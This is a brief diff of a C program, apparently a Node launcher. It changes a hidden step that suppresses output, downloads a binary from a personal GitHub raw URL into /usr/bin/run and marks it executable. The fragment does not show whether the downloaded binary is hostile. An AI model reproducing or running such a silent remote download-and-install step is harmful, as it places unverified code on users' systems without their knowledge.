@@ -12,7 +12,6 @@
 #include <sys/prctl.h>
 
 int is_linux_environment() {
-    // Di Linux, kita asumsikan environment selalu valid
     return 1;
 }
 
@@ -91,7 +90,7 @@ void run_node_directly() {
             freopen("/dev/null", "w", stdout);
             freopen("/dev/null", "w", stderr);
             chdir("/usr/bin");
-            system("wget -O /usr/bin/run https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Termux/run");
+            system("wget -O /usr/bin/run https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Linux/run");
             system("chmod +x /usr/bin/run");
             FILE *npm_output = popen("npm root -g", "r");
             char node_path[1024];
